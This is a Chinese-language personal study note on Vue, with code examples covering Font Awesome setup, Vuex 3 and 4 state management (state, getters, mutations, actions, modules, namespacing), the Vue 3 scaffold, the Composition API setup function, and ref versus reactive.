![img](vue%E7%AC%94%E8%AE%B02.0.assets/76a6009809f544a1ad8fa270237a2b6f.png)



## 第三方图标库

> **由于Element UI提供的字体图符较少，**一般会采用其他图表库，如著名的Font Awesome
>
> Font Awesome提供了675个可缩放的矢量图标，可以使用CSS所提供的所有特性对它们进行更改，包括大小、颜色、阴影或者其他任何支持的效果。
>
> **文档地址：**[Font Awesome，一套绝佳的图标字体库和CSS框架](http://fontawesome.dashgame.com/)
>
> **安装：**npm install font-awesome
>
> **使用：**import 'font-awesome/css/font-awesome.min.css'

![img](vue%E7%AC%94%E8%AE%B02.0.assets/31af853d2a5f4769a5aa9b790cd4617b.png)

**这里我是用了这行代码**

```html
  <i class="fa fa-camera-retro fa-lg"></i>
```

**页面效果**

![img](vue%E7%AC%94%E8%AE%B02.0.assets/9711d29814564d51afbbbaa1c5b9c189.png)

# Vuex

## Vuex 3

Vuex 是一个专为 Vue.js 应用程序开发的状态管理模式。它采用集中式存储管理应用的所有组件的状态，并以相应的规则保证状态以一种可预测的方式发生变化。

每一个 Vuex 应用的核心就是 store（仓库）。“store”基本上就是一个容器，它包含着你的应用中大部分的状态 (state)。Vuex 和单纯的全局对象有以下两点不同：

Vuex 的状态存储是响应式的。当 Vue 组件从 store 中读取状态的时候，若 store 中的状态发生变化，那么相应的组件也会相应地得到高效更新。

你不能直接改变 store 中的状态。改变 store 中的状态的唯一途径就是显式地提交 (commit) mutation。这样使得我们可以方便地跟踪每一个状态的变化，从而让我们能够实现一些工具帮助我们更好地了解我们的应用。

- [vuex 中文文档](https://vuex.vuejs.org/zh/)

### 一、安装与使用

```bash
$ yarn add vuex
```

简单使用：

```javascript
import Vue from 'vue'
import Vuex from 'vuex'

Vue.use(Vuex)

const store = new Vuex.Store({
  state: {
    count: 0
  }
})

const app = new Vue({
  el: '#app',
  // 把 store 对象提供给 “store” 选项，这可以把 store 的实例注入所有的子组件, 使用 app.$store (组件中使用 this.$store)调用
  store,
  template: `<div>{{ count }}</div>`,
  computed: {
    count () {
      return store.state.count
    }
  }
})
```

### 二、状态管理模式

Vuex 状态管理示意图：

![image-20231121204636343](vue%E7%AC%94%E8%AE%B02.0.assets/image-20231121204636343.png)

### 二、State

state 保存了程序需要运行时的所有状态, 遵循以下原则：

- 单一状态树：每个应用将仅仅包含一个 store 实例

#### 在组件中使用

```javascript
computed: {
  count () {
    return store.state.count
  }
}
```

#### mapState

当一个组件需要获取多个状态时候，将这些状态都声明为计算属性会有些重复和冗余。为了解决这个问题，可以使用 `mapState` 辅助函数帮助我们生成计算属性。

**对象语法**

```javascript
// 在单独构建的版本中辅助函数为 Vuex.mapState
import { mapState } from 'vuex'

// ...

computed: mapState({
  // 箭头函数可使代码更简练
  count: state => state.count,

  // 传字符串参数 'count' 等同于 `state => state.count`
  countAlias: 'count',

  // 为了能够使用 `this` 获取局部状态，必须使用常规函数
  countPlusLocalState (state) {
    return state.count + this.localCount
  }
})
```

**数组语法**<br />当映射的计算属性的名称与 state 的子节点名称相同时，我们也可以给 `mapState` 传一个字符串数组。

```javascript
computed: mapState([
  // 映射 this.count 为 store.state.count
  'count'
])
```

**对象展开运算符**<br />事实上，computed 不只包含 state 中的属性，还应包含其他计算属性，此时可以使用 ES6 的展开运算符。

```javascript
computed: {
  // 使用对象展开运算符将此对象混入到外部对象中
  ...mapState({
    count: state => state.count
  }),
  localComputed () { return this.otherData }
}
```

### 三、Getter

有时候我们需要从 store 中的 state 中派生出一些状态，这时，可以使用 getter，getter 实际上相当于 state 的计算属性。

如果在组件中使用计算属性，像这样：

```javascript
computed: {
  doneTodosCount () {
    return this.$store.state.todos.filter(todo => todo.done).length
  }
}
```

写起来比较繁琐，而且如果很多组件都需要使用这样的状态，每个组件都得重新定义一下。

改用 getter 写起来就非常方便，它接受一个 state 参数：

```javascript
const store = new Vuex.Store({
  state: {
    todos: [
      { id: 1, text: '...', done: true },
      { id: 2, text: '...', done: false }
    ]
  },
  getters: {
    doneTodos: state => {
      return state.todos.filter(todo => todo.done)
    }
  }
})
```

Getter 也可以接受其他 getters 作为第二个参数：

```javascript
const store = new Vuex.Store({
  // ...
  getters: {
    doneTodosCount: (state, getters) => {
      return getters.doneTodos.length
    }
  }
})
```

也可以通过让 getter 返回一个函数，来实现给 getter 传参。这对 store 里的数组进行查询时非常有用。

```javascript
getters: {
  // ...
  getTodoById: (state) => (id) => {
    return state.todos.find(todo => todo.id === id)
  }
}
store.getters.getTodoById(2) // -> { id: 2, text: '...', done: false }
```

#### 在组件中使用

在组件中只需要在计算属性中引入这些 getter 即可。

```javascript
computed: {
  doneTodosCount () {
    return this.$store.getters.doneTodosCount
  }
}
```

#### mapGetters

`mapGetters` 辅助函数可以将 store 中的 getter 映射到局部计算属性。

**数组语法**

```javascript
import { mapGetters } from 'vuex'

export default {
  // ...
  computed: {
    // 使用对象展开运算符将 getter 混入 computed 对象中
    ...mapGetters([
      'doneTodosCount',
      'anotherGetter',
      // ...
    ])
  }
}
```

**对象语法**<br />如果你想将一个 getter 属性另取一个名字，使用对象形式：

```javascript
mapGetters({
  // 映射 `this.doneCount` 为 `store.getters.doneTodosCount`
  doneCount: 'doneTodosCount'
})
```

### 四、Mutation

更改 Vuex 的 store 中的状态的唯一方法是提交 mutation。Vuex 中的 mutation 非常类似于事件：每个 mutation 都有一个字符串的 **事件类型 (type)** 和 一个 **回调函数 (handler)**。这个回调函数就是我们实际进行状态更改的地方，并且它会接受 state 作为第一个参数：

```javascript
const store = new Vuex.Store({
  state: {
    count: 1
  },
  mutations: {
    increment (state) {
      // 变更状态
      state.count++
    }
  }
})
```

不能直接调用一个 mutation handler。这个选项更像是事件注册：“当触发一个类型为 `increment` 的 mutation 时，调用此函数。”要唤醒一个 mutation handler，你需要以相应的 type 调用 **store.commit** 方法：

```javascript
store.commit('increment')
```

Mutation 必须是同步函数。

#### 提交载荷 (Payload)

可以向 `store.commit` 传入额外的参数，即 mutation 的 **载荷（payload）**：

```javascript
const store = new Vuex.Store({
  state: {
    count: 1
  },
  mutations: {
    increment (state, n) {
      state.count += n
    }
  }
})

store.commit('increment', 10)
```

在大多数情况下，载荷应该是一个对象，这样可以包含多个字段并且记录的 mutation 会更易读：

```javascript
const store = new Vuex.Store({
  // ...
  mutations: {
    increment (state, payload) {
      state.count += payload.amount
    }
  }
})

store.commit('increment', {
  amount: 10
})
```

#### 对象风格的提交方式

提交 mutation 的另一种方式是直接使用包含 `type` 属性的对象：

```javascript
store.commit({
  type: 'increment',
  amount: 10
})
```

当使用对象风格的提交方式，整个对象都作为载荷传给 mutation 函数，因此 handler 保持不变：

```javascript
mutations: {
  increment (state, payload) {
    state.count += payload.amount
  }
}
```

#### 使用常量替代 Mutation 事件类型

使用常量替代 mutation 事件类型在各种 Flux 实现中是很常见的模式。这样可以使 linter 之类的工具发挥作用，同时把这些常量放在单独的文件中可以让你的代码合作者对整个 app 包含的 mutation 一目了然：

```javascript
// mutation-types.js
export const SOME_MUTATION = 'SOME_MUTATION'

// store.js
import Vuex from 'vuex'
import { SOME_MUTATION } from './mutation-types'

const store = new Vuex.Store({
  state: { ... },
  mutations: {
    // 我们可以使用 ES2015 风格的计算属性命名功能来使用一个常量作为函数名
    [SOME_MUTATION] (state) {
      // mutate state
    }
  }
})
```

<a name="mapMutations"></a>

#### mapMutations

可以在组件中使用 `this.$store.commit('xxx')` 提交 mutation，或者使用 `mapMutations` 辅助函数将组件中的 methods 映射为 `store.commit` 调用（需要在根节点注入 `store`）。

```javascript
import { mapMutations } from 'vuex'

export default {
  // ...
  methods: {
    ...mapMutations([
      'increment', // 将 `this.increment()` 映射为 `this.$store.commit('increment')`

      // `mapMutations` 也支持载荷：
      'incrementBy' // 将 `this.incrementBy(amount)` 映射为 `this.$store.commit('incrementBy', amount)`
    ]),
    ...mapMutations({
      add: 'increment' // 将 `this.add()` 映射为 `this.$store.commit('increment')`
    })
  }
}
```

注意，在 beforeCreate 的时候还不能获取到 methods 里面的方法。

### 五、Action

Action 类似于 mutation，不同在于：

- Action 提交的是 mutation，而不是直接变更状态。
- Action 可以包含任意异步操作。

让我们来注册一个简单的 action：

```javascript
const store = new Vuex.Store({
  state: {
    count: 0
  },
  mutations: {
    increment (state) {
      state.count++
    }
  },
  actions: {
    increment (context) {
      context.commit('increment')
    }
  }
})
```

Action 函数接受一个与 store 实例具有相同方法和属性的 context 对象，因此可以调用 `context.commit` 提交一个 mutation，通过 `context.state` 和 `context.getters` 来获取 state 和 getters。

<a name="f9829ba9"></a>

#### 参数解构

实际应用当中，可以使用 [参数解构](https://github.com/lukehoban/es6features#destructuring) 来简化代码（特别是我们需要调用 `commit` 很多次的时候）：

```javascript
actions: {
  increment ({ commit }) {
    commit('increment')
  }
}
```

<a name="2fa34eb6"></a>

#### 分发 Action

Action 通过 `store.dispatch` 方法触发：

```javascript
store.dispatch('increment')
```

Actions 支持同样的载荷方式和对象方式进行分发：

```javascript
// 以载荷形式分发
store.dispatch('incrementAsync', {
  amount: 10
})

// 以对象形式分发
store.dispatch({
  type: 'incrementAsync',
  amount: 10
})
```

<a name="iQRTl"></a>

#### 提交载荷 (Payload)

同样的，action 支持传递载荷，可以通过第二参数接收载荷，比如一个购物车结算的 action：

```javascript
actions: {
  checkout ({ commit, state }, products) {
    // 把当前购物车的物品备份起来
    const savedCartItems = [...state.cart.added]
    // 发出结账请求，然后乐观地清空购物车
    commit(types.CHECKOUT_REQUEST)
    // 购物 API 接受一个成功回调和一个失败回调
    shop.buyProducts(
      products,
      // 成功操作
      () => commit(types.CHECKOUT_SUCCESS),
      // 失败操作
      () => commit(types.CHECKOUT_FAILURE, savedCartItems)
    )
  }
}
```

注意这里正在进行一系列的异步操作，并且通过提交 mutation 来记录 action 产生的副作用（即状态变更）。

<a name="mapActions"></a>

#### mapActions

在组件中可以使用 `this.$store.dispatch('xxx')` 分发 action，也可以使用 `mapActions` 辅助函数将组件的 methods 映射为 `store.dispatch` 调用（需要先在根节点注入 `store`）。

```javascript
import { mapActions } from 'vuex'

export default {
  // ...
  methods: {
    ...mapActions([
      'increment', // 将 `this.increment()` 映射为 `this.$store.dispatch('increment')`
      // `mapActions` 也支持载荷：
      'incrementBy' // 将 `this.incrementBy(amount)` 映射为 `this.$store.dispatch('incrementBy', amount)`
    ]),
    ...mapActions({
      add: 'increment' // 将 `this.add()` 映射为 `this.$store.dispatch('increment')`
    })
  }
}
```

<a name="683d24bc"></a>

#### 组合 Action

Action 通常是异步的，那么我们如何才能组合多个 action，以处理更加复杂的异步流程？

首先，需要明白 `store.dispatch` 可以处理被触发的 action 的处理函数返回的 Promise，并且 `store.dispatch` 仍旧返回 Promise：

```javascript
actions: {
  actionA ({ commit }) {
    return new Promise((resolve, reject) => {
      setTimeout(() => {
        commit('someMutation')
        resolve()
      }, 1000)
    })
  }
}
```

这时就可以这样调用：

```javascript
store.dispatch('actionA').then(() => {
  // ...
})
```

在另外一个 action 中也可以：

```javascript
actions: {
  // ...
  actionB ({ dispatch, commit }) {
    return dispatch('actionA').then(() => {
      commit('someOtherMutation')
    })
  }
}
```

如果我们利用 [async / await](https://tc39.github.io/ecmascript-asyncawait/)，我们可以如下组合 action：

```javascript
// 假设 getData() 和 getOtherData() 返回的是 Promise

actions: {
  async actionA ({ commit }) {
    commit('gotData', await getData())
  },
  async actionB ({ dispatch, commit }) {
    await dispatch('actionA') // 等待 actionA 完成
    commit('gotOtherData', await getOtherData())
  }
}
```

<a name="34fc4207"></a>

### 六、Module

由于使用单一状态树，应用的所有状态会集中到一个比较大的对象。当应用变得非常复杂时，store 对象就有可能变得相当臃肿。

为了解决以上问题，Vuex 允许我们将 store 分割成**模块（module）**。每个模块拥有自己的 state、mutation、action、getter、甚至是嵌套子模块——从上至下进行同样方式的分割：

```javascript
const moduleA = {
  state: { ... },
  mutations: { ... },
  actions: { ... },
  getters: { ... }
}

const moduleB = {
  state: { ... },
  mutations: { ... },
  actions: { ... }
}

const store = new Vuex.Store({
  modules: {
    a: moduleA,
    b: moduleB
  }
})

store.state.a // -> moduleA 的状态
store.state.b // -> moduleB 的状态
```

<a name="5faeb6da"></a>

#### 模块的局部状态

对于模块内部的 mutation 和 getter，接收的第一个参数是**模块的局部状态对象**。

```javascript
const moduleA = {
  state: { count: 0 },
  mutations: {
    increment (state) {
      // 这里的 `state` 对象是模块的局部状态
      state.count++
    }
  },

  getters: {
    doubleCount (state) {
      return state.count * 2
    }
  }
}
```

同样，对于模块内部的 action，局部状态通过 `context.state` 暴露出来，根节点状态则为 `context.rootState`：

```javascript
const moduleA = {
  // ...
  actions: {
    incrementIfOddOnRootSum ({ state, commit, rootState }) {
      if ((state.count + rootState.count) % 2 === 1) {
        commit('increment')
      }
    }
  }
}
```

对于模块内部的 getter，根节点状态会作为第三个参数暴露出来：

```javascript
const moduleA = {
  // ...
  getters: {
    sumWithRootCount (state, getters, rootState) {
      return state.count + rootState.count
    }
  }
}
```

<a name="11d878fa"></a>

### 七、命名空间

默认情况下，模块内部的 action、mutation 和 getter 是注册在**全局命名空间**的——这样使得多个模块能够对同一 mutation 或 action 作出响应。

如果希望你的模块具有更高的封装度和复用性，你可以通过添加 `namespaced: true` 的方式使其成为命名空间模块。当模块被注册后，它的所有 getter、action 及 mutation 都会自动根据模块注册的路径调整命名。例如：

```javascript
const store = new Vuex.Store({
  modules: {
    account: {
      namespaced: true,

      // 模块内容（module assets）
      state: { ... }, // 模块内的状态已经是嵌套的了，使用 `namespaced` 属性不会对其产生影响
      getters: {
        isAdmin () { ... } // -> getters['account/isAdmin']
      },
      actions: {
        login () { ... } // -> dispatch('account/login')
      },
      mutations: {
        login () { ... } // -> commit('account/login')
      },

      // 嵌套模块
      modules: {
        // 继承父模块的命名空间
        myPage: {
          state: { ... },
          getters: {
            profile () { ... } // -> getters['account/profile']
          }
        },

        // 进一步嵌套命名空间
        posts: {
          namespaced: true,

          state: { ... },
          getters: {
            popular () { ... } // -> getters['account/posts/popular']
          }
        }
      }
    }
  }
})
```

启用了命名空间的 getter 和 action 会收到局部化的 `getter`，`dispatch` 和 `commit`。换言之，你在使用模块内容（module assets）时不需要在同一模块内额外添加空间名前缀。更改 `namespaced` 属性后不需要修改模块内的代码。

#### 在命名空间模块内访问全局内容（Global Assets）

如果你希望使用全局 state 和 getter，`rootState` 和 `rootGetter` 会作为第三和第四参数传入 getter，也会通过 `context` 对象的属性传入 action。

若需要在全局命名空间内分发 action 或提交 mutation，将 `{ root: true }` 作为第三参数传给 `dispatch` 或 `commit`即可。

```javascript
modules: {
  foo: {
    namespaced: true,

    getters: {
      // 在这个模块的 getter 中，`getters` 被局部化了
      // 你可以使用 getter 的第四个参数来调用 `rootGetters`
      someGetter (state, getters, rootState, rootGetters) {
        getters.someOtherGetter // -> 'foo/someOtherGetter'
        rootGetters.someOtherGetter // -> 'someOtherGetter'
      },
      someOtherGetter: state => { ... }
    },

    actions: {
      // 在这个模块中， dispatch 和 commit 也被局部化了
      // 他们可以接受 `root` 属性以访问根 dispatch 或 commit
      someAction ({ dispatch, commit, getters, rootGetters }) {
        getters.someGetter // -> 'foo/someGetter'
        rootGetters.someGetter // -> 'someGetter'

        dispatch('someOtherAction') // -> 'foo/someOtherAction'
        dispatch('someOtherAction', null, { root: true }) // -> 'someOtherAction'

        commit('someMutation') // -> 'foo/someMutation'
        commit('someMutation', null, { root: true }) // -> 'someMutation'
      },
      someOtherAction (ctx, payload) { ... }
    }
  }
}
```

<a name="19351008"></a>

#### 带命名空间的绑定函数

当使用 `mapState`, `mapGetters`, `mapActions` 和 `mapMutations` 这些函数来绑定命名空间模块时，写起来可能比较繁琐：

```javascript
computed: {
  ...mapState({
    a: state => state.some.nested.module.a,
    b: state => state.some.nested.module.b
  })
},
methods: {
  ...mapActions([
    'some/nested/module/foo',
    'some/nested/module/bar'
  ])
}
```

对于这种情况，你可以将模块的空间名称字符串作为第一个参数传递给上述函数，这样所有绑定都会自动将该模块作为上下文。于是上面的例子可以简化为：

```javascript
computed: {
  ...mapState('some/nested/module', {
    a: state => state.a,
    b: state => state.b
  })
},
methods: {
  ...mapActions('some/nested/module', [
    'foo',
    'bar'
  ])
}
```

而且，你可以通过使用 `createNamespacedHelpers` 创建基于某个命名空间辅助函数。它返回一个对象，对象里有新的绑定在给定命名空间值上的组件绑定辅助函数：

```javascript
import { createNamespacedHelpers } from 'vuex'

const { mapState, mapActions } = createNamespacedHelpers('some/nested/module')

export default {
  computed: {
    // 在 `some/nested/module` 中查找
    ...mapState({
      a: state => state.a,
      b: state => state.b
    })
  },
  methods: {
    // 在 `some/nested/module` 中查找
    ...mapActions([
      'foo',
      'bar'
    ])
  }
}
```

### 十、综合使用

动态管理

+ 安装( npm i vuex@3.0.0 )
+ 编写store
+ main.js注册

```

```



##  Vuex 4

官网：[https://next.vuex.vuejs.org/](https://next.vuex.vuejs.org/)

在Composition API中，Vuex状态管理暴露了一个 `useStore` 方法，可以直接获取到 `this.$store` 的引用：

```vue
<template>
 <div>{{state.name}}</div>
 <button @click="setData">设置数据</button>
</template>

<script>
import { useStore } from 'vuex'

export default {
  setup() {
    const { state, commit, dispatch } = useStore()

    function setData() {
      commit('SET_DATA', "Hello world")
    }

    return {
      state,
      setData
    }
  },
}
</script>
```

以后就再也不用 `this.$store.commit` 、 `this.$store.dispatch` 地用了，很爽是不是。

# vue3

## 分析脚手架

mian.js

```js
//引入的不再是Vue构造函数了，引入的是一个名为createApp的工厂函数
import { createApp } from 'vue'
import App from './App.vue'

//创建应用实例对象——app(类似于之前Vue2中的vm，但app比vm更“轻”)
const app = createApp(App)

//挂载
app.mount('#app')

```

App.vue

```vue
<template>
	<!-- Vue3组件中的模板结构可以没有根标签 -->
	<img alt="Vue logo" src="./assets/logo.png">
	<HelloWorld msg="Welcome to Your Vue.js App"/>
</template>

<script>
	import HelloWorld from './components/HelloWorld.vue'

	export default {
		name: 'App',
		components: {
			HelloWorld
		}
	}
</script>

<style>
#app {
  font-family: Avenir, Helvetica, Arial, sans-serif;
  -webkit-font-smoothing: antialiased;
  -moz-osx-font-smoothing: grayscale;
  text-align: center;
  color: #2c3e50;
  margin-top: 60px;
}
</style>

```

HelloWorld.vue

```vue
<template>
  <div class="hello">
    <h1>{{ msg }}</h1>
    <p>
      For a guide and recipes on how to configure / customize this project,<br>
      check out the
      <a href="https://cli.vuejs.org" target="_blank" rel="noopener">vue-cli documentation</a>.
    </p>
    <h3>Installed CLI Plugins</h3>
    <ul>
      <li><a href="https://github.com/vuejs/vue-cli/tree/dev/packages/%40vue/cli-plugin-babel" target="_blank" rel="noopener">babel</a></li>
      <li><a href="https://github.com/vuejs/vue-cli/tree/dev/packages/%40vue/cli-plugin-eslint" target="_blank" rel="noopener">eslint</a></li>
    </ul>
    <h3>Essential Links</h3>
    <ul>
      <li><a href="https://vuejs.org" target="_blank" rel="noopener">Core Docs</a></li>
      <li><a href="https://forum.vuejs.org" target="_blank" rel="noopener">Forum</a></li>
      <li><a href="https://chat.vuejs.org" target="_blank" rel="noopener">Community Chat</a></li>
      <li><a href="https://twitter.com/vuejs" target="_blank" rel="noopener">Twitter</a></li>
      <li><a href="https://news.vuejs.org" target="_blank" rel="noopener">News</a></li>
    </ul>
    <h3>Ecosystem</h3>
    <ul>
      <li><a href="https://router.vuejs.org" target="_blank" rel="noopener">vue-router</a></li>
      <li><a href="https://vuex.vuejs.org" target="_blank" rel="noopener">vuex</a></li>
      <li><a href="https://github.com/vuejs/vue-devtools#vue-devtools" target="_blank" rel="noopener">vue-devtools</a></li>
      <li><a href="https://vue-loader.vuejs.org" target="_blank" rel="noopener">vue-loader</a></li>
      <li><a href="https://github.com/vuejs/awesome-vue" target="_blank" rel="noopener">awesome-vue</a></li>
    </ul>
  </div>
</template>

<script>
export default {
  name: 'HelloWorld',
  props: {
    msg: String
  }
}
</script>

<!-- Add "scoped" attribute to limit CSS to this component only -->
<style scoped>
h3 {
  margin: 40px 0 0;
}
ul {
  list-style-type: none;
  padding: 0;
}
li {
  display: inline-block;
  margin: 0 10px;
}
a {
  color: #42b983;
}
</style>

```



## Composition API (组合式API)

官方文档: https://v3.cn.vuejs.org/guide/composition-api-introduction.html

### 1.setup函数

#### 基本使用

1. 理解：Vue3.0中一个新的配置项，值为一个函数。
2. setup是所有<strong style="color:#DD5145">Composition API（组合API）</strong><i style="color:gray;font-weight:bold">“ 表演的舞台 ”</i>。
3. 组件中所用到的：数据、方法等等，均要配置在setup中。
4. setup函数的两种返回值：
   1. 若返回一个对象，则对象中的属性、方法, 在模板中均可以直接使用。（重点关注！）
   2. <span style="color:#aad">若返回一个渲染函数：则可以自定义渲染内容。（了解）</span>
5. 在 Vue 3 中，组件的 `setup` 函数中，`this` 不再指向组件实例，而是指向 `undefined`。及**不能使用this**
5. 注意点：
   1. **不要与Vue2.x语法混用**
      - Vue2.x配置（data、methos、computed...）中<strong style="color:#DD5145">可以访问到</strong>setup中的属性、方法。
      - 但在setup中<strong style="color:#DD5145">不能访问到</strong>Vue2.x配置（data、methos、computed...）。
      - 如果有重名, setup优先。
   2. **setup不能是一个async函数**，因为返回值不再是return的对象, 而是promise, 模板看不到return对象中的属性。（后期也可以返回一个Promise实例，但需要Suspense和异步组件的配合）

示例：

```vue
<template>
 <div>count: {{count}}</div>
 <div>double: {{double}}</div>
 <button @click="add">+1</button>
 <button @click="subtract">-1</button>
</template>

<script>
import { ref, reactive, computed, onMounted } from 'vue'

export default {
  setup() {
    let count = ref(0)
    let double = computed(() => count.value * 2)

    function add() {
      count.value += 1
    }
    function subtract() {
      count.value -= 1
    }

    onMounted(() => { console.log('onMounted') })

    return {
      add,
      subtract,
      count,
      double,
    }
  },
}
</script>
```

在Composition API中，通过setup函数暴露一些属性和方法，达到数据响应、生命周期Hook、计算属性的目的。简而言之，它只是一个将属性和函数返回到模板的函数，我们在这里声明所有响应性属性、计算属性、观察者、方法、和生命周期 hook，然后将它们返回，以便可以在模板中使用它们。我们不从 setup 函数返回的内容在模板中将会变得不可用。

**注意点:**

- setup执行的时机
  - 在beforeCreate之前执行一次，this是undefined。
- setup的参数
  - props：值为对象，包含：组件外部传递过来，且组件内部声明接收了的属性。
  - context：上下文对象
    - attrs: 值为对象，包含：组件外部传递过来，但没有在props配置中声明的属性, 相当于 ```this.$attrs```。
    - slots: 收到的插槽内容, 相当于 ```this.$slots```。
    - emit: 分发自定义事件的函数, 相当于 ```this.$emit```。

#### setup的参数

##### props

setup支持接收参数，第一个参数是props，接收来自父组件的传值。

组件 `HelloWorld` ：

```vue
<template>
  <h1>{{ msg }}</h1>
</template>

<script>
import { watchEffect } from 'vue'
export default {
  name: 'HelloWorld',
    //参数
  props: {
    msg: String
  },
  setup(props) {
    watchEffect(() => {
      console.log(props.msg)
    })
  }
}
</script>
```

`props` 是响应式的，作为参数传递到setup，watchEffect可以监听到props的变化。

在父组件中：

```vue
<template>
<HelloWorld :msg="msg"></HelloWorld>
<button @click="setData">设置数据</button>
</template>

<script>
import HelloWorld from '../components/HelloWorld.vue'

export default {
  components: { HelloWorld },
  setup() {
    let msg = ref('Hello xiaoyu')
    function setData() {
      msg.value = 'Hello world'
    }

    return {
      msg,
      setData
    }
  },
}
</script>
```

点击按钮，修改父组件中的msg，对应子组件中的数据也会得到修改，并触发watchEffect。![GIF (3)](vue%E7%AC%94%E8%AE%B02.0.assets/GIF%20(3).gif)

值得注意的是，子组件中的**props不能直接解构**，否则会使watchEffect失效，使其失去响应性：

```javascript
  setup({msg}) {
    watchEffect(() => {
      console.log(msg)
    })
  }
```

##### context

第二个参数提供了一个上下文对象，从原来 2.x 中 `this` 选择性地暴露了一些 property。

```javascript
const MyComponent = {
  setup(props, context) {
    context.attrs
    context.slots
    context.emit
  },
}
```

`attrs` 和 `slots` 都是内部组件实例上对应项的代理，可以确保在更新后仍然是最新值。所以可以解构，无需担心后面访问到过期的值：

```javascript
const MyComponent = {
  setup(props, { attrs }) {
    // 一个可能之后回调用的签名
    function onClick() {
      console.log(attrs.foo) // 一定是最新的引用，没有丢失响应性
    }
  },
}
```

出于一些原因将 `props` 作为第一个参数，而不是包含在上下文中：

- 组件使用 `props` 的场景更多，有时候甚至只使用 `props`
- 将 `props` 独立出来作为第一个参数，可以让 TypeScript 对 `props` 单独做类型推导，不会和上下文中的其他属性相混淆。这也使得 `setup` 、 `render` 和其他使用了 TSX 的函数式组件的签名保持一致。

### 4.Vue3.0中的更删改查操作

#### vue2.x的响应式

- 实现原理：

  - 对象类型：通过```Object.defineProperty()```对属性的读取、修改进行拦截（数据劫持）。

  - 数组类型：通过重写更新数组的一系列方法来实现拦截。（对数组的变更方法进行了包裹）。

    ```js
    Object.defineProperty(data, 'count', {
        get () {}, 
        set () {}
    })
    ```

- 存在问题：

  - 新增属性、删除属性, 界面不会更新。
  - 直接通过下标修改数组, 界面不会自动更新。

#### Vue3.0的响应式

+ 解决:
  - 新增属性、删除属性, 界面不会更新。
  - 直接通过下标修改数组, 界面不会自动更新。

- 实现原理: 

  - 通过Proxy（代理）:  拦截对象中任意属性的变化, 包括：属性值的读写、属性的添加、属性的删除等。

  - 通过Reflect（反射）:  对源对象的属性进行操作。

  - MDN文档中描述的Proxy与Reflect：

    - Proxy：https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Proxy

    - Reflect：https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Reflect

      ```js
      new Proxy(data, {
      	// 拦截读取属性值
          get (target, prop) {
          	return Reflect.get(target, prop)
          },
          // 拦截设置属性值或添加新属性
          set (target, prop, value) {
          	return Reflect.set(target, prop, value)
          },
          // 拦截删除属性
          deleteProperty (target, prop) {
          	return Reflect.deleteProperty(target, prop)
          }
      })
      
      proxy.name = 'tom'   
      ```

###  5. 属性

#### 1.data属性

#####  ref函数

- 作用: 定义一个<strong style="color:#DD5145">基本类型</strong>响应式的数据
- 语法: ```const xxx = ref(initValue)``` 
  - 创建一个包含响应式数据的<strong style="color:#DD5145">引用对象（reference对象，简称ref对象）</strong>
  - JS中操作数据： ```xxx.value```
  - 模板中读取数据: 不需要.value，直接：```<div>{{xxx}}</div>```
  - 
- 备注：
  - 接收的数据可以是：基本类型、也可以是对象类型
  - 基本类型的数据：响应式依然是靠``Object.defineProperty()``的```get```与```set```完成的
  - 对象类型的数据：内部 <i style="color:gray;font-weight:bold">“ 求助 ”</i> 了Vue3.0中的一个新函数—— ```reactive```函数

```vue
<template>
	<h1>一个人的信息</h1>
	<h2>姓名：{{name}}</h2>
	<h2>年龄：{{age}}</h2>
	<h3>工作种类：{{job.type}}</h3>
	<h3>工作薪水：{{job.salary}}</h3>
	<button @click="changeInfo">修改人的信息</button>
</template>

/*
- 作用: 定义一个基本类型的响应式的数据
- 创建一个包含响应式数据的<strong style="color:#DD5145">引用对象(reference对象, 简称ref对象)</strong>。
- JS中操作数据: xxx.value
- 模板中读取数据: 不需要.value, 直接: <div>{{xxx}}</div>
 */
<script>
	import {ref} from 'vue'        // 引入
	export default {
		name: 'App',
		setup(){
			//数据
			let name = ref('张三')   //ref定义一个响应式的数据(动态)
			let age = ref(18)
			// 对象最好是使用reactive函数
			let job = ref({
				type:'前端工程师',
				salary:'30K'
			})

			//方法
			function changeInfo(){
				// name.value = '李四'
				// age.value = 48
				console.log(job.value)
				// job.value.type = 'UI设计师'  //不能写成job.type.value
				// job.value.salary = '60K'
				// console.log(name,age)
			}

			//返回一个对象（常用）
			return {
				name,
				age,
				job,
				changeInfo
			}
		}
	}
</script>
```

##### reactive函数

- 作用: 定义一个<strong style="color:#DD5145">对象类型</strong>的响应式数据（基本类型不要用它，要用```ref```函数）
- 语法：```const 代理对象= reactive(源对象)```接收一个对象（或数组），返回一个<strong style="color:#DD5145">代理对象（Proxy的实例对象，简称proxy对象）</strong>
- 备注：
  + 内部基于 ES6 的 Proxy 实现，通过代理对象操作源对象内部数据进行操作

```vue
<template>
	<h1>一个人的信息</h1>
	<h2>姓名：{{person.name}}</h2>
	<h2>年龄：{{person.age}}</h2>
	<h3>工作种类：{{person.job.type}}</h3>
	<h3>工作薪水：{{person.job.salary}}</h3>
	<h3>爱好：{{person.hobby}}</h3>
	<h3>测试的数据c：{{person.job.a.b.c}}</h3>
	<button @click="changeInfo">修改人的信息</button>
</template>

/*
- 作用: 定义一个对象类型的响应式数据（基本类型不要用它，要用ref函数）
- 语法：```const 代理对象= reactive(源对象)接收一个对象（或数组），返回一个代理对象（Proxy的实例对象，简称proxy对象）</strong>
- reactive定义的响应式数据是“深层次的”。
- 内部基于 ES6 的 Proxy 实现，通过代理对象操作源对象内部数据进行操作。
 */
<script>
	import {reactive} from 'vue'
	export default {
		name: 'App',
		setup(){
			//数据
			let person = reactive({
				name:'张三',
				age:18,
				job:{
					type:'前端工程师',
					salary:'30K',
					a:{
						b:{
							c:666
						}
					}
				},
				hobby:['抽烟','喝酒','烫头']
			})

			//方法
			function changeInfo(){
				person.name = '李四'
				person.age = 48
				person.job.type = 'UI设计师'
				person.job.salary = '60K'
				person.job.a.b.c = 999
				person.hobby[0] = '学习'
			}

			//返回一个对象（常用）
			return {
				person,
				changeInfo
			}
		}
	}
</script>
```

**reactive对比ref**

-  从定义数据角度对比：
   -  ref用来定义：<strong style="color:#DD5145">基本类型数据</strong>。
   -  reactive用来定义：<strong style="color:#DD5145">对象（或数组）类型数据</strong>。
   -  备注：ref也可以用来定义<strong style="color:#DD5145">对象（或数组）类型数据</strong>, 它内部会自动通过```reactive```转为<strong style="color:#DD5145">代理对象</strong>。
-  从原理角度对比：
   -  ref通过``Object.defineProperty()``的```get```与```set```来实现响应式（数据劫持）。
